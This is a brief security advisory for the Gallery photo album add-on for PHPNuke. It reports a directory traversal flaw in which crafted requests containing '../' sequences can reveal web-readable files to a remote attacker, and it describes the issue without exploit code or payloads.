Bharat Mediratta Gallery is a free, open source web-based photo album which may be used as an add-on for the PHPNuke web portal.

Due to insufficient validation of user-supplied input, it is be possible to view arbitrary web-readable files via a specially crafted web request which contains '../' sequences.

This issue may allow a remote attacker to gather sensitive information which may be used in directed and organized attacks against a host running the Gallery software.
